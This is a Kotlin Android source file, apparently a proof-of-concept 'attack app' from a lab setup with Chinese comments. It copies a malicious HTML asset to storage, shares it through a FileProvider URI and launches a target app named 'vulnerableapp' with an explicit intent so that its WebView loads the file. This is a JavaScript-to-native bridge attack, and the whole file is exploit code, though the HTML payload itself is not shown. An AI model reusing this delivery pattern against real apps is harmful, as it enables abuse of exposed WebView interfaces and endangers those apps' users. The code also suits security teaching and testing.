package com.example.attackapp

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import java.io.File

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 复制 malicious.html 到 filesDir
        copyAssetToFile("malicious.html", File(filesDir, "malicious.html"))

        findViewById<Button>(R.id.btnJs2nativeAttack).setOnClickListener {
            js2nativeAttack()
        }
    }

    private fun js2nativeAttack() {
        // 使用 FileProvider 获取文件的 URI
        val maliciousFile = File(filesDir, "malicious.html")
        val uri: Uri = FileProvider.getUriForFile(this, "$packageName.fileprovider", maliciousFile)

        // 创建 Intent 启动 vulnerableapp 并加载恶意 HTML 文件
        val intent = Intent()
        intent.action = Intent.ACTION_VIEW
        intent.data = uri
        intent.setClassName("com.example.vulnerableapp", "com.example.vulnerableapp.MainActivity")
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        startActivity(intent)
    }

    private fun copyAssetToFile(assetFileName: String, outputFile: File) {
        assets.open(assetFileName).use { inputStream ->
            outputFile.outputStream().use { outputStream ->
                inputStream.copyTo(outputStream)
            }
        }
    }
}
